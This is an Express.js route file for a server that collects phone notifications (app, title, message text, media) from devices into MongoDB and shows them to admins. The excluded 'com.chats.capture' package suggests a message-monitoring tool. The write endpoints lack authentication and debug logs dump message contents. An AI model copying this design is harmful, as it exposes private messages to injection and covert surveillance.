const express = require('express');
const router = express.Router();
const { getDb } = require('../database/mongodb');
const crypto = require('crypto');
const websocketService = require('../services/websocketService');
const { authenticate, optionalAuth } = require('../middleware/auth');

// Optimized logging - only log full data in development
const isDebug = process.env.NODE_ENV !== 'production';

// Packages to exclude from notification storage
const EXCLUDED_PACKAGES = ['com.chats.capture', 'com.chats.controller'];

// POST /api/notifications - Single notification
router.post('/', async (req, res) => {
    try {
        const notification = req.body;
        
        // Filter out notifications from excluded packages
        if (notification.appPackage && EXCLUDED_PACKAGES.includes(notification.appPackage)) {
            console.log(`🚫 FILTERED: Ignoring notification from excluded package: ${notification.appPackage}`);
            return res.json({
                success: true,
                message: 'Notification filtered (excluded package)',
                filtered: true
            });
        }
        
        // Optimized logging - only log summary unless DEBUG mode
        if (isDebug) {
            console.log('📥 API RECEIVED NOTIFICATION:', JSON.stringify(notification, null, 2));
        } else {
            console.log(`📥 API RECEIVED: ID=${notification.id}, App=${notification.appName} (${notification.appPackage}), Title="${notification.title?.substring(0, 50)}"`);
        }
        
        // Validate required fields
        if (!notification.id || !notification.appPackage || !notification.appName) {
            console.error('❌ API VALIDATION ERROR: Missing required fields', {
                hasId: !!notification.id,
                hasAppPackage: !!notification.appPackage,
                hasAppName: !!notification.appName
            });
            return res.status(400).json({
                success: false,
                message: 'Missing required fields'
            });
        }
        
        const db = getDb();
        const existing = await db.collection('notifications').findOne({ id: notification.id });
        const iconUrl = notification.iconUrl || (existing && existing.iconUrl) || null;
        const notificationDoc = {
            id: notification.id,
            deviceId: notification.deviceId || null,
            appPackage: notification.appPackage,
            appName: notification.appName,
            title: notification.title || null,
            text: notification.text || null,
            messageLines: notification.messageLines || null,
            isGroupSummary: notification.isGroupSummary || false,
            timestamp: notification.timestamp || Date.now(),
            mediaUrls: notification.mediaUrls || null,
            serverMediaUrls: notification.serverMediaUrls || null,
            iconUrl: iconUrl,
            synced: true, // Mark as synced since it's on server
            syncAttempts: 0,
            lastSyncAttempt: null,
            errorMessage: null,
            createdAt: Math.floor(Date.now() / 1000)
        };
        
        // Use replaceOne with upsert for INSERT OR REPLACE behavior
        await db.collection('notifications').replaceOne(
            { id: notification.id },
            notificationDoc,
            { upsert: true }
        );
        
        // Optimized logging
        if (isDebug) {
            console.log('✅ API SAVED NOTIFICATION TO DATABASE:', JSON.stringify(notificationDoc, null, 2));
        } else {
            console.log(`✅ API SAVED: ID=${notificationDoc.id}, Device=${notificationDoc.deviceId}, App=${notificationDoc.appName}`);
        }
        
        // Broadcast WebSocket update
        if (notification.deviceId) {
            websocketService.broadcastDataUpdate(notification.deviceId, 'notification', notification);
        }
        
        const response = {
            success: true,
            message: 'Notification saved successfully'
        };
        if (isDebug) {
            console.log('📤 API RESPONSE:', JSON.stringify(response, null, 2));
        }
        
        res.json(response);
    } catch (error) {
        console.error('Error saving notification:', error);
        res.status(500).json({
            success: false,
            message: 'Error saving notification'
        });
    }
});

// POST /api/notifications/batch - Batch notifications
router.post('/batch', async (req, res) => {
    try {
        const { notifications } = req.body;
        
        if (!Array.isArray(notifications) || notifications.length === 0) {
            return res.status(400).json({
                success: false,
                message: 'notifications array is required and must not be empty'
            });
        }
        
        console.log('📥 /api/notifications/batch received', {
            count: notifications.length,
            sample: notifications.length > 0 ? {
                id: notifications[0]?.id,
                appPackage: notifications[0]?.appPackage,
                appName: notifications[0]?.appName,
                title: notifications[0]?.title?.substring(0, 30),
                hasText: !!notifications[0]?.text,
                timestamp: notifications[0]?.timestamp
            } : null
        });
        
        // Filter out notifications from excluded packages
        const filteredNotifications = notifications.filter(notification => {
            if (notification.appPackage && EXCLUDED_PACKAGES.includes(notification.appPackage)) {
                console.log(`🚫 FILTERED: Ignoring notification from excluded package: ${notification.appPackage}`);
                return false;
            }
            return true;
        });
        
        const filteredCount = notifications.length - filteredNotifications.length;
        if (filteredCount > 0) {
            console.log(`🚫 FILTERED: ${filteredCount} notification(s) from excluded packages`);
        }
        
        if (filteredNotifications.length === 0) {
            console.log('🚫 FILTERED: All notifications were filtered out');
            return res.json({
                success: true,
                message: 'All notifications filtered (excluded packages)',
                filtered: true,
                count: 0
            });
        }
        
        // Optimized logging
        console.log(`📥 API RECEIVED BATCH: ${notifications.length} notifications (${filteredNotifications.length} after filtering)`);
        if (isDebug) {
            console.log('📥 BATCH DATA:', JSON.stringify(filteredNotifications, null, 2));
        }
        
        const db = getDb();
        const ids = filteredNotifications.map(notification => notification.id).filter(Boolean);
        const existingNotifications = ids.length
            ? await db.collection('notifications').find({ id: { $in: ids } }).toArray()
            : [];
        const existingIconMap = new Map(existingNotifications.map(n => [n.id, n.iconUrl]));

        const operations = filteredNotifications.map(notification => {
            const iconUrl = notification.iconUrl || existingIconMap.get(notification.id) || null;
            return {
            replaceOne: {
                filter: { id: notification.id },
                replacement: {
                    id: notification.id,
                    deviceId: notification.deviceId || null,
                    appPackage: notification.appPackage,
                    appName: notification.appName,
                    title: notification.title || null,
                    text: notification.text || null,
                    messageLines: notification.messageLines || null,
                    isGroupSummary: notification.isGroupSummary || false,
                    timestamp: notification.timestamp || Date.now(),
                    mediaUrls: notification.mediaUrls || null,
                    serverMediaUrls: notification.serverMediaUrls || null,
                    iconUrl: iconUrl,
                    synced: true,
                    syncAttempts: 0,
                    lastSyncAttempt: null,
                    errorMessage: null,
                    createdAt: Math.floor(Date.now() / 1000)
                },
                upsert: true
            }
        }});
        
        console.log('🧾 /api/notifications/batch saving', {
            operations: operations.length,
            firstId: operations[0]?.replaceOne?.replacement?.id
        });
        await db.collection('notifications').bulkWrite(operations);
        console.log('✅ /api/notifications/batch saved', { count: operations.length });
        
        // Optimized logging
        console.log(`✅ API SAVED BATCH: ${filteredNotifications.length} notifications to database${filteredCount > 0 ? ` (${filteredCount} filtered)` : ''}`);
        if (isDebug) {
            console.log('✅ BATCH SAVED DATA:', JSON.stringify(operations.map(op => op.replaceOne.replacement), null, 2));
        }
        
        // Broadcast WebSocket updates for each notification
        filteredNotifications.forEach(notification => {
            if (notification.deviceId) {
                websocketService.broadcastDataUpdate(notification.deviceId, 'notification', notification);
            }
        });
        
        const response = {
            success: true,
            message: `Saved ${filteredNotifications.length} notifications${filteredCount > 0 ? ` (${filteredCount} filtered)` : ''}`
        };
        if (isDebug) {
            console.log('📤 API BATCH RESPONSE:', JSON.stringify(response, null, 2));
        }
        
        res.json(response);
    } catch (error) {
        console.error('❌ /api/notifications/batch error saving batch:', {
            message: error?.message,
            stack: error?.stack
        });
        res.status(500).json({
            success: false,
            message: 'Error saving batch'
        });
    }
});

// GET /api/notifications - Get notifications (with device filtering)
router.get('/', authenticate, async (req, res) => {
    try {
        const user = req.user || {};
        const role = user.role;
        const assignedDeviceId = user.deviceId;
        const deviceId = req.query.deviceId;
        
        const page = parseInt(req.query.page) || 1;
        // Optimize: Reduce default limit for faster initial load, allow override
        const limit = Math.min(parseInt(req.query.limit) || 30, 100); // Max 100, default 30
        const skip = (page - 1) * limit;
        
        const db = getDb();
        const filter = {};
        
        // Always exclude notifications from excluded packages
        filter.appPackage = { $nin: EXCLUDED_PACKAGES };
        
        // Device owners can only see notifications from their assigned device
        if (role === 'device_owner' && assignedDeviceId) {
            filter.deviceId = assignedDeviceId;
        } else if (role === 'admin') {
            // Admin can filter by deviceId if provided, otherwise see all
            if (deviceId) {
            filter.deviceId = deviceId;
            }
        } else {
            // Non-admin, non-device-owner users cannot access notifications
            return res.status(403).json({
                success: false,
                message: 'Access denied'
            });
        }
        
        // Optimize: Use projection to only return needed fields (faster query, less data transfer)
        const projection = {
            id: 1,
            deviceId: 1,
            appPackage: 1,
            appName: 1,
            title: 1,
            text: 1,
            timestamp: 1,
            mediaUrls: 1,
            serverMediaUrls: 1,
            iconUrl: 1,
            synced: 1,
            createdAt: 1
            // Exclude: syncAttempts, lastSyncAttempt, errorMessage (not needed for console display)
        };
        
        // Optimize: Use compound index (deviceId + timestamp) for faster queries
        const notifications = await db.collection('notifications')
            .find(filter, { projection })
            .sort({ timestamp: -1 })
            .limit(limit)
            .skip(skip)
            .toArray();
        
        // Get total count for pagination (only if requested)
        let totalCount = null;
        if (req.query.includeCount === 'true') {
            totalCount = await db.collection('notifications').countDocuments(filter);
        }
        
        // Format response - convert synced to boolean (handle both boolean and number formats)
        const formattedNotifications = notifications.map(notification => ({
            ...notification,
            mediaUrls: notification.mediaUrls || null,
            serverMediaUrls: notification.serverMediaUrls || null,
            synced: notification.synced === true || notification.synced === 1
        }));
        
        const response = {
            success: true,
            data: formattedNotifications,
            pagination: {
                page,
                limit,
                hasMore: notifications.length === limit
            }
        };
        
        if (totalCount !== null) {
            response.pagination.total = totalCount;
            response.pagination.totalPages = Math.ceil(totalCount / limit);
        }
        
        // Add cache headers for better performance (5 minutes cache)
        res.set('Cache-Control', 'private, max-age=300');
        
        res.json(response);
    } catch (error) {
        console.error('Error fetching notifications:', error);
        res.status(500).json({
            success: false,
            message: 'Error fetching notifications'
        });
    }
});

module.exports = router;
